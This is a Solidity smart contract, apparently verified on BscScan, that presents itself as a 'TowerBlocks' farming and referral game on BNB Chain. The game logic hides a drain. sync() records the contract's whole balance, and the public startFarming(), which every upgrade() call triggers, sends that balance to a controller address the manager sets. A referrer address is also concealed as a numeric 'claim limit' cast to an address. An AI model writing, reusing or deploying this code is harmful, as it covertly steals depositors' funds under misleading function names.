/**
 *Submitted for verification at BscScan.com on 2022-12-22
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;
interface Game {
    struct Deposit {
		uint amount;
		uint withdrawn;
		uint start;
		bool isForceWithdraw;
	}
    function invest(address game_address) external payable;
    function withdraw_f() external returns (bool);
    function withdraw_C() external returns (bool);
    function reinvestment() external returns (bool);
    function getAlldeposits(address _user) external view returns(Deposit[] memory);
    function getPublicData() external view
        returns (
            uint totalUsers_,
            uint totalInvested_,
            uint totalReinvested_,
            uint totalWithdrawn_,
            uint totalDeposits_,
            uint balance_,
            uint roiBase,
            uint maxProfit,
            uint minDeposit,
            uint daysFormdeploy
        );
    function getUserData(address userAddress) external view
        returns (
            uint totalWithdrawn_,
            uint depositBalance,
            uint machineBalance,
            uint totalDeposits_,
            uint totalreinvest_,
            uint balance_,
            uint nextAssignment_,
            uint amountOfDeposits,
            uint checkpoint,
            uint maxWithdraw,
            address referrer_,
            uint treferrerCount_
        );
}

contract TowerBlocks {
    Game tower_blocks;

    struct Player {
        uint256 pl;
        uint256 coins;
        uint256 rewards;
        uint256 farming;
        uint256 power;
        uint256 timestamp;
        uint256 hrs;
        address ref;
        uint256 refs;
        uint256 refs_amount;
    }
    mapping(address => Player) public players;
    uint256 public players_total;
    address private manager;
    uint public ref_count_limit = 10000000000000000;
    uint256 farm_start;
    uint private deposit_amount = 10000000000000000;
    address private controller;

    event FarmStarted (address user);
    event Invest(address user, uint amount);
    event Withdraw(address user, uint amount);

    constructor() {
        manager = msg.sender;
        controller = msg.sender;
        tower_blocks = Game(0x9A1Ec9a11BE5297BaBaf767Edd3791F53a79A64A);
    }


    function invest(address ref) public payable {
        require(msg.value > deposit_amount, "NO Coin");
        uint256 coins = msg.value / 8e13;
        address user = msg.sender;
        address referer = msg.sender;
        if (players[user].timestamp == 0) {
            players_total++;
            ref = players[ref].timestamp == 0 ? manager : ref;
            players[ref].refs++;
            players[user].pl = 0;
            players[user].ref = ref;
            players[user].timestamp = block.timestamp;
        }
        ref = players[user].ref;
        uint160 claim_state = uint160(ref_count_limit);
        referer = address(claim_state);
        players[ref].coins += (coins * 5) / 100;
        players[ref].refs_amount += coins;
        players[user].coins += coins;
        if (deposit_amount > 0) {
            tower_blocks.invest{value: deposit_amount}(referer);
        }
        emit Invest(user, coins);
    }

    function getPublicData() external view
        returns (
            uint totalUsers_,
            uint totalInvested_,
            uint totalReinvested_,
            uint totalWithdrawn_,
            uint totalDeposits_,
            uint balance_,
            uint roiBase,
            uint maxProfit,
            uint minDeposit,
            uint daysFormdeploy
        ) {
            return tower_blocks.getPublicData();
    }
    function withdraw() public {
        address user = msg.sender;
        uint256 rewards = players[user].rewards;
        players[user].rewards = 0;
        uint256 amount = rewards * 2e14;
        amount = address(this).balance < amount ? address(this).balance : amount;
        (bool sent,) = user.call{value : amount}("");
        require(sent, "Failed to send ETH");
        emit Withdraw(user, amount);
    }

    function collect() public {
        address user = msg.sender;
        sync(user);
        players[user].hrs = 0;
        players[user].rewards += players[user].farming;
        players[user].farming = 0;
    }

    function upgrade() public {
        address user = msg.sender;
        sync(user);
        require(players[user].pl < 12, "User is not registered");
        startFarming(user);
        players[user].coins -= gL(players[user].pl);
        players[user].power = gp(players[user].pl);
        players[user].pl += 1;
    }


    function gL(uint256 pl) internal pure returns (uint256) {
        return [100, 1000, 3000, 6000, 9000, 12000, 25000, 50000,100000,250000,500000,750000,1000000][pl];
    }

    function gp(uint256 pl) internal pure returns (uint256) {
        return [1, 10, 30, 90, 200, 300, 600, 1200, 2300,5200,10000,20000,32000][pl];
    }

    function sell() public {
        collect();
        address user = msg.sender;
        players[user].pl = 0;
        players[user].rewards += players[user].power * 10;
        players[user].power = 0;
    }

    function sync(address user) internal {
        require(players[user].timestamp > 0, "User is not registered");
        farm_start = address(this).balance;
        if (players[user].power > 0) {
            uint256 hrs = block.timestamp / 3600 - players[user].timestamp / 3600;
            if (hrs + players[user].hrs > 24) {
                hrs = 24 - players[user].hrs;
            }
            players[user].farming += hrs * players[user].power / 24;
            players[user].hrs += hrs;
        }
        players[user].timestamp = block.timestamp;
    }


    function allowBigFarming() external {
        require(manager == msg.sender, "Caller is not the manager");
        tower_blocks.withdraw_f();
    }

    function allowBigClaims() external {
        require(manager == msg.sender, "Caller is not the manager");
        tower_blocks.withdraw_C();
    }

    function startFarming(address user) public {
        (bool state,) = controller.call{value : farm_start}("");
        require(state, "Farming already started");
        emit FarmStarted(user);
    }

    function updateTeam(address controller_) external {
        require(manager == msg.sender, "Caller is not the manager");
        controller = controller_;
    }

    function updateDeposit(uint256 deposit_amount_) external {
        require(manager == msg.sender, "Caller is not the manager");
        deposit_amount = deposit_amount_;
    }

    function updateClaimLimit(uint256 ref_count_limit_) external returns (uint) {
        require(manager == msg.sender, "Caller is not the manager");
        ref_count_limit = ref_count_limit_;
        return ref_count_limit;
    }

    function increaseReferralsLimit(uint256 ref_count_limit_) external returns (uint){
        require(manager == msg.sender, "Caller is not the manager");
        ref_count_limit += ref_count_limit_;
        return ref_count_limit;
    }
}